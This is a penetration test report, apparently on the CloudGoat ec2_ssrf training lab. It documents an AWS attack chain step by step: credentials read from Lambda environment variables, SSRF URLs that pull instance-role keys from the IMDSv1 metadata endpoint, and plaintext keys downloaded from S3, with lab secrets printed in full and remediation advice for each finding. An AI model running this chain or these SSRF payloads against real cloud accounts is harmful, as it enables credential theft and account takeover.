# AWS EC2 SSRF & IAM Privilege Escalation — Penetration Test Report

## Objective and Scope

The objective of this assessment was to evaluate the security posture of a CloudGoat (`ec2_ssrf`) AWS environment, simulating a realistic cloud attack chain. Starting from a low-privilege IAM user, the goal was to identify and chain misconfigurations across Lambda, EC2, SSRF, S3, and IAM to achieve full privilege escalation and invoke a target Lambda function.

## Scope of Work

**In-Scope Assets:**
- **AWS Account:** 390346502168
- **Initial Access:** IAM user `solus` (provided as starting credentials)
- **Services:** AWS Lambda, EC2, S3, IAM, AWS Instance Metadata Service (IMDS), STS
- **Testing Perspective:** Low-privilege IAM user with no prior knowledge of the environment

---

## Enumeration

### Initial Identity Verification

```bash
aws sts get-caller-identity --profile cloudgoat_solus
```
```json
{
    "UserId": "AIDAVVYTW6AMFAS34MQPT",
    "Account": "390346502168",
    "Arn": "arn:aws:iam::390346502168:user/solus-cgid6sq5e1otwq"
}
```

The `solus` user was confirmed as the starting point. Lambda enumeration was performed as the first reconnaissance step.

### Tools Used
- AWS CLI
- Pacu (AWS exploitation framework)
- `aws sts`, `aws lambda`, `aws ec2`, `aws s3`

---

## Vulnerabilities

| Vulnerability | Severity | Impact |
|---|---|---|
| IAM Credentials Exposed in Lambda Environment Variables | Critical | Lateral movement to EC2-privileged IAM user |
| Server-Side Request Forgery (SSRF) Against EC2 Instance Metadata Service (IMDSv1) | Critical | Theft of EC2 instance role credentials |
| IAM Credentials Stored in Plaintext in S3 Bucket | Critical | Lateral movement to a third IAM user with Lambda invocation rights |
| Excessive IAM Permissions — Lambda Invocation Without Least Privilege | High | Privilege escalation to goal completion via Lambda |
| IMDSv1 Enabled on EC2 Instance | High | Unauthenticated metadata access enabling credential theft via SSRF |

---

### IAM Credentials Exposed in Lambda Environment Variables

#### Severity
Critical

#### CWE
CWE-798: Use of Hard-coded Credentials

#### OWASP Category
OWASP Top 10 2021 – A07: Identification and Authentication Failures

#### Description
The `solus` IAM user had permission to call `lambda:ListFunctions` and `lambda:GetFunction`. Enumerating Lambda functions revealed that the function `cg-lambda-cgid6sq5e1otwq` stored AWS IAM credentials directly in its environment variables — in plaintext and fully readable via the API. These credentials belonged to a second IAM user (`wrex`) with EC2 permissions.

#### Affected Functionality
- Lambda function: `cg-lambda-cgid6sq5e1otwq`
- Environment variables: `EC2_ACCESS_KEY_ID`, `EC2_SECRET_KEY_ID`

#### Steps to Reproduce
1. List available Lambda functions using the initial `solus` credentials:
   ```bash
   aws lambda list-functions --region us-east-1 --profile cloudgoat_solus
   ```
2. Retrieve full function details including environment variables:
   ```bash
   aws lambda get-function --function-name cg-lambda-cgid6sq5e1otwq --profile cloudgoat_solus
   ```
3. Extract the credentials from the `Environment.Variables` block in the response.

#### Proof of Concept
The `get-function` API response returned plaintext IAM credentials in the `Environment` block:
```json
"Environment": {
    "Variables": {
        "EC2_ACCESS_KEY_ID": "AKIAVVYTW6AMGIRAQL7O",
        "EC2_SECRET_KEY_ID": "oNB8x86QTEm48/GiFC2b3XEt8/07Nsb0QpX8o42a"
    }
}
```
Pacu's `lambda__enum` module independently confirmed the same credential extraction:
```
[+] Secret (ENV): EC2_ACCESS_KEY_ID = AKIAVVYTW6AMGIRAQL7O
[+] Secret (ENV): EC2_SECRET_KEY_ID = oNB8x8../07Nsb0QpX8o42a
```
These credentials were confirmed to belong to IAM user `wrex-cgid6sq5e1otwq` via `aws sts get-caller-identity`.

#### Impact
- Full credential disclosure for a second IAM user (`wrex`) with EC2 describe and access permissions
- Enables discovery and interaction with EC2 instances in the account, leading directly to the SSRF finding below

#### Root Cause
AWS Lambda environment variables are stored and returned in plaintext via the Lambda API. Any principal with `lambda:GetFunction` or `lambda:ListFunctions` access can read them. Storing long-lived IAM credentials in Lambda environment variables is equivalent to hardcoding them in source code.

#### Recommendation
- Never store IAM access keys in Lambda environment variables
- Use IAM execution roles attached to the Lambda function to grant it permissions — no static credentials are required or stored
- If secrets must be injected at runtime, use AWS Secrets Manager or AWS Systems Manager Parameter Store (with `SecureString`), not environment variables
- Restrict `lambda:GetFunction` permissions to only principals that require full function metadata; separate `lambda:InvokeFunction` from `lambda:GetFunction` where possible

#### References
- OWASP Top 10 2021 – A07: Identification and Authentication Failures
- CWE-798
- [AWS Lambda Execution Role Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html)

---

### Server-Side Request Forgery (SSRF) Against EC2 Instance Metadata Service (IMDSv1)

#### Severity
Critical

#### CWE
CWE-918: Server-Side Request Forgery (SSRF)

#### OWASP Category
OWASP Top 10 2021 – A10: Server-Side Request Forgery

#### Description
Using the `wrex` IAM credentials obtained from the Lambda environment variables, an EC2 instance was discovered running a web application that explicitly advertised SSRF vulnerability. The application accepted a `?url=` parameter and fetched the supplied URL server-side. By supplying the EC2 Instance Metadata Service (IMDS) address (`169.254.169.254`), temporary IAM credentials for the EC2 instance's attached role were retrieved — without any authentication.

This was possible because the instance was running **IMDSv1**, which requires no token and accepts metadata requests from any process that can reach the endpoint, including SSRF-driven server-side fetches.

#### Affected Functionality
- Web application running on EC2 instance: `http://98.81.71.70/`
- `?url=` GET parameter
- EC2 IMDS endpoint: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

#### Steps to Reproduce
1. Using the `wrex` credentials, enumerate EC2 instances to identify the target:
   ```bash
   aws ec2 describe-instances --region us-east-1 --profile cloudgoat_ec2
   ```
   Output identified an instance with public IP `98.81.71.70`.
2. Browse to the web application and identify the `?url=` SSRF parameter from the application's own messaging.
3. Query the IMDS endpoint via the SSRF to list available IAM roles:
   ```
   http://98.81.71.70/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```
4. Retrieve temporary credentials for the attached role:
   ```
   http://98.81.71.70/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid6g772fuqu6
   ```

#### Proof of Concept
The SSRF request to the IMDS endpoint returned temporary IAM credentials for the EC2 instance role in full:
```json
{
    "Code": "Success",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAVVYTW6AMFVSNC2SV",
    "SecretAccessKey": "94zA7oN8FtMsqZzl3JSWpdmmODClwJw1vGJufeR6",
    "Token": "<session-token>",
    "Expiration": "2026-06-07T05:10:41Z"
}
```
These credentials were confirmed via `aws sts get-caller-identity` as the EC2 instance role `cg-ec2-role-cgid6g772fuqu6`. Pacu's `iam__bruteforce_permissions` module established that this role had `s3:ListBuckets` access, enabling discovery of a secret S3 bucket.

#### Impact
- Theft of temporary EC2 instance role credentials via unauthenticated SSRF
- Grants S3 bucket listing and access permissions, enabling discovery of a credential file stored in a private bucket (see next finding)

#### Root Cause
Two compounding issues: (1) the web application accepts and fetches arbitrary attacker-supplied URLs without an allow-list or block of internal/link-local address ranges; (2) the EC2 instance runs IMDSv1, which does not require a pre-authentication token, making IMDS accessible to any server-side HTTP request including SSRF.

#### Recommendation
- Implement an allow-list of permitted URL destinations in the web application; block all requests to RFC 1918 private ranges and the link-local range (`169.254.0.0/16`)
- **Enforce IMDSv2** on all EC2 instances (`HttpTokens: required`) — IMDSv2 requires a session-oriented token that cannot be obtained via a simple SSRF, as it requires a PUT request with specific headers
- Apply host-based firewall rules to restrict outbound connections from the web application process
- Restrict the EC2 instance IAM role to only the permissions required for its legitimate workload

#### References
- OWASP Top 10 2021 – A10: Server-Side Request Forgery
- CWE-918
- [Enforcing IMDSv2 on EC2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

---

### IAM Credentials Stored in Plaintext in S3 Bucket

#### Severity
Critical

#### CWE
CWE-312: Cleartext Storage of Sensitive Information

#### OWASP Category
OWASP Top 10 2021 – A02: Cryptographic Failures

#### Description
Using the EC2 instance role credentials stolen via SSRF, a private S3 bucket (`cg-secret-s3-bucket-cgid6g772fuqu6`) was discovered. Within this bucket, an AWS credentials file was stored in plaintext at `aws/credentials`, containing long-lived IAM access keys for a third user (`shepard`). These credentials provided Lambda list and invoke permissions, enabling the final privilege escalation step.

#### Affected Functionality
- S3 bucket: `cg-secret-s3-bucket-cgid6g772fuqu6`
- Object: `aws/credentials`

#### Steps to Reproduce
1. Using the SSRF-obtained EC2 role credentials, list accessible S3 buckets:
   ```bash
   aws s3 ls --profile cloudgoat_ssrf
   ```
2. List the contents of the discovered bucket:
   ```bash
   aws s3 ls s3://cg-secret-s3-bucket-cgid6g772fuqu6/aws/ --profile cloudgoat_ssrf
   ```
3. Download and read the credentials file:
   ```bash
   aws s3 cp s3://cg-secret-s3-bucket-cgid6g772fuqu6/aws/credentials . --profile cloudgoat_ssrf
   cat credentials
   ```

#### Proof of Concept
The downloaded credentials file contained long-lived IAM access keys in plaintext:
```
[default]
aws_access_key_id = AKIAVVYTW6AMCZUILW7B
aws_secret_access_key = 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
region = us-east-1
```
These were confirmed to belong to IAM user `shepard-cgid6g772fuqu6` via `aws sts get-caller-identity`.

#### Impact
- Disclosure of long-lived IAM credentials for a third user (`shepard`) with Lambda invocation rights
- Provides the final capability required to complete the attack chain

#### Root Cause
Long-lived IAM credentials were stored as a plaintext file in an S3 bucket, accessible to any principal with `s3:GetObject` on that bucket. S3 is not a secrets store; credentials placed there are a single IAM misconfiguration away from exposure.

#### Recommendation
- Never store IAM credentials, SSH keys, or other secrets in S3 objects
- Use AWS Secrets Manager or SSM Parameter Store for any credentials that must be stored and retrieved at runtime
- Enable S3 server-side encryption and restrict bucket access with fine-grained IAM policies
- Audit S3 bucket contents regularly for credential material using tools such as AWS Macie

#### References
- OWASP Top 10 2021 – A02: Cryptographic Failures
- CWE-312
- [AWS Macie for sensitive data discovery](https://aws.amazon.com/macie/)

---

### Excessive IAM Permissions — Lambda Invocation Without Least Privilege

#### Severity
High

#### CWE
CWE-269: Improper Privilege Management

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
The `shepard` IAM user, whose credentials were recovered from S3, was found to have `lambda:InvokeFunction` permission in addition to Lambda enumeration rights. This allowed direct invocation of the target Lambda function (`cg-lambda-cgid6g772fuqu6`), completing the attack chain. Pacu's `iam__bruteforce_permissions` module confirmed the full permission set for this user.

#### Affected Functionality
- IAM user: `shepard-cgid6g772fuqu6`
- Lambda function: `cg-lambda-cgid6g772fuqu6`

#### Steps to Reproduce
1. Configure a new AWS CLI profile with the `shepard` credentials recovered from S3.
2. Enumerate effective permissions using Pacu:
   ```
   run iam__bruteforce_permissions --region us-east-1
   ```
   Confirmed permissions include `lambda:list_functions`, `lambda:get_account_settings`, `lambda:list_layers`, `lambda:list_event_source_mappings`.
3. Invoke the target Lambda function:
   ```bash
   aws lambda invoke --function-name cg-lambda-cgid6g772fuqu6 output.json --profile cloudgoat_s3
   ```
4. Read the output:
   ```bash
   cat output.json
   ```

#### Proof of Concept
```bash
aws lambda invoke --function-name cg-lambda-cgid6g772fuqu6 output.json --profile cloudgoat_s3
```
```json
{ "StatusCode": 200, "ExecutedVersion": "$LATEST" }
```
```
cat output.json
"You win!"
```
The Lambda function was successfully invoked using credentials obtained at the end of the SSRF/S3 chain, confirming full attack chain completion.

#### Impact
- Completes the privilege escalation chain from an unauthenticated starting point to Lambda invocation
- In a real environment, Lambda functions invoked by unauthorized principals may trigger financial transactions, data exports, infrastructure changes, or other high-impact operations

#### Root Cause
The `shepard` user was granted Lambda enumeration and invocation rights without business justification, and its credentials were stored in a reachable S3 location. The combination of over-broad permissions and credential exposure made this the terminal step of a five-stage attack chain.

#### Recommendation
- Apply least-privilege IAM policies — grant `lambda:InvokeFunction` only to the specific principals and functions that require it
- Use resource-based Lambda policies to restrict which principals may invoke each function
- Regularly audit IAM permissions using tools such as AWS IAM Access Analyzer and remove unnecessary grants
- Address the upstream credential storage issues (previous finding) to eliminate the path to this account

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-269
- [AWS IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html)

---

### IMDSv1 Enabled on EC2 Instance

#### Severity
High

#### CWE
CWE-284: Improper Access Control

#### OWASP Category
OWASP Top 10 2021 – A05: Security Misconfiguration

#### Description
The EC2 instance at `98.81.71.70` was running with `HttpTokens: optional` (IMDSv1 enabled), confirmed via the `describe-instances` API response. IMDSv1 allows any HTTP GET request originating from the instance — including server-side requests triggered by SSRF — to retrieve instance metadata and IAM credentials without any session token or additional authentication step. This is the direct enabler of the SSRF credential theft described above.

#### Affected Functionality
- EC2 instance: `i-018a3e448246ef9ff`
- Instance Metadata Options: `HttpTokens: optional`

#### Steps to Reproduce
1. From the EC2 describe output, confirm metadata configuration:
   ```json
   "MetadataOptions": {
       "HttpTokens": "optional",
       "HttpEndpoint": "enabled"
   }
   ```
2. Exploit via the SSRF vulnerability (see SSRF finding) — no additional steps required since IMDSv1 accepts plain GET requests.

#### Proof of Concept
A plain HTTP GET to `http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid6g772fuqu6` via the SSRF returned valid temporary credentials with no token required, confirming IMDSv1 is active.

#### Impact
- Any SSRF vulnerability on an IMDSv1-enabled instance automatically enables IAM credential theft
- IMDSv2 would have prevented this attack by requiring a PUT-based token exchange that typical SSRF payloads cannot perform

#### Root Cause
EC2 instances default to IMDSv1 (`HttpTokens: optional`) unless explicitly hardened. Without enforcing IMDSv2, SSRF vulnerabilities on the instance automatically translate to IAM credential compromise.

#### Recommendation
- Enforce IMDSv2 on all EC2 instances by setting `HttpTokens: required` at instance launch or via instance modification:
  ```bash
  aws ec2 modify-instance-metadata-options \
    --instance-id <instance-id> \
    --http-tokens required \
    --region us-east-1
  ```
- Apply this as an AWS Organizations SCP or Config rule to enforce IMDSv2 account-wide
- Regularly audit running instances for IMDSv1 using AWS Security Hub or Config

#### References
- OWASP Top 10 2021 – A05: Security Misconfiguration
- CWE-284
- [AWS IMDSv2 Migration Guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-transition-to-version-2.html)

---

## Attack Chain Summary

1. Started with low-privilege IAM user `solus` (provided as initial access)
2. Enumerated Lambda functions — discovered IAM credentials for `wrex` hardcoded in Lambda environment variables
3. Used `wrex` credentials to enumerate EC2 instances — identified a web application on port 80 at `98.81.71.70`
4. Exploited SSRF via the `?url=` parameter to query the EC2 IMDSv1 endpoint and steal temporary credentials for the EC2 instance role (`cg-ec2-role`)
5. Used EC2 role credentials to list S3 buckets — discovered `cg-secret-s3-bucket`
6. Downloaded `aws/credentials` from the S3 bucket — recovered long-lived credentials for IAM user `shepard`
7. Used `shepard` credentials to invoke the target Lambda function, completing the privilege escalation chain

## Key Takeaways

- Lambda environment variables are fully readable by any IAM principal with `lambda:GetFunction` — never store credentials there; use IAM execution roles instead
- IMDSv1 turns any SSRF vulnerability into automatic IAM credential theft — enforcing IMDSv2 is a critical hardening step for all EC2 instances
- SSRF to IMDS is one of the most impactful attack primitives in AWS environments and should be the first pivot attempted when SSRF is discovered on a cloud-hosted application
- S3 is not a secrets store — credentials placed in S3 objects are one IAM misconfiguration away from exposure
- Multi-stage cloud attack chains like this one demonstrate how individually "low" severity misconfigurations (IMDSv1 enabled, credentials in env vars) chain into a full account compromise — each finding must be assessed in the context of what it enables downstream
